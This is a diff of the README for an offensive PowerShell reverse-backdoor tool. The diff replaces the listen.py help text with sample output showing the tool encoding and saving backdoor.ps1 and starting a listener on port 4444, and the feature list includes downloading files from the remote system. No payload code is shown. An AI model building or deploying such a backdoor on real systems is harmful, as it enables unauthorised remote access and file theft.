@@ -1,6 +1,6 @@
 # powershell-backdoor
 A Powershell Reverse Backdoor
-
+![preview](preview.png)
 # Features / To Do
 ## Features 
 * Download Files from remote system
@@ -19,18 +19,10 @@ A Powershell Reverse Backdoor
 # Setup
 Don't change the code inside template.ps1, instead run listen.py
 ```
-usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--out-file OUT_FILE] [--verbose]
-
-Powershell Backdoor
-
-options:
-  -h, --help            show this help message and exit
-  --ip-address IP_ADDRESS, -I IP_ADDRESS
-                        IP Address to bind to default: xxx.xxx.x.xx (your local ip)
-  --port PORT, -p PORT  Port to connect over default:4444
-  --out-file OUT_FILE, -O OUT_FILE
-                        Generated backdoor filename
-  --verbose             Show verbose output
+PS C:\Users\DrewQ\Desktop> python .\listen.py --verbose
+[*] Encoding backdoor script
+[*] Saved backdoor backdoor.ps1 sha1:02cf166bbe6fdf8f3db4d3e6d04e5e2cf8b98a6b
+[*] Starting Backdoor Listener 192.168.0.223:4444
 ```
 No arguments are required, backdoor.ps1 will be dropped in the current working directory.
 
